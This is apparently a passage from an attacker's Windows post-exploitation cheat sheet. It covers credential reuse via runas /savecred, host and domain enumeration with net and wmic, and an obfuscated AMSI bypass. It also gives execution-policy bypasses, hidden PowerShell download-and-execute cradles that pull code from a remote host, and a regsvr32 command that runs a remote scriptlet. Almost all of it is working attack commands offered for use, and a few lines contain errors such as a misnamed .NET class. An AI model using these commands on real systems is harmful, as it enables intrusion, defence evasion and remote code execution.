Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\


### Native CMD Host enum
```
echo %userdomain%
echo %logonserver%
echo %homepath%
echo %homedrive%
net share
net accounts
systeminfo
tasklist /svc
gpresult /z
net locakgroup administrators
netsh advfirewall show allprofiles state
$env
Tree $home
```

### WMIC Host enumeration:

```
wmic startup
wmic softwareelement
wmic process list brief
wmic group list brief
wmic computersystem list
wmic process list brief
wmic ntdomain list brief
wmic group list full /format:table
wmic user list full /format:table
wmic sysaccount list full /format:table
wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'" | ft
wmic process call create "cmd.exe /c calc.exe"
```

### PowerShell
Amsi bypass:
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Version 2: `PowerShell.exe -version 2`
$cert = Get-ChildItem -Path “Cert:\CurrentUser\My” -CodeSigningCert
Set-AuthenticodeSignature -FilePath “C:\Scripts\MyScript.ps1” -Certificate $cert

Bypass EP
PowerShell -ep bypass -file script.ps1
Execute script contents directly
Invoke-command with script block {} 
Use stdin and GC: Get-Content .\file.ps1 | PowerShell.exe –NoProfile –Command -

### Windows Firewall rule:
```
New-NetFirewallRule -DisplayName "name" -RemoteAddress -Direction Outbound -Action Block -Enabled True
New-NetFirewallRule -DisplayName "name" -Program program.exe -Direction Outbound -Action Block -Enabled True
```

# Payload execution:

## PowerShell
Download and invoke (Dot Net): `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
Download and invoke (IWR): `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
Exection bypass: `powershell.exe -ep bypass -c '{Powershell to execute}'`\
Exection bypass: `powershell.exe -ep bypass -f file_to_open.ps1`\
STDin and Get-Content: `Get-Content .\file.ps1 | PowerShell.exe –NoProfile -ExecutionPolicy ByPass –Command -`

PS Options:

-ExecutionPolicy Bypass\
-NoLogo\
-NonInteractive\
-NoProfile\
-NoExit


## Scrobly doo dobble job job whatever
RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
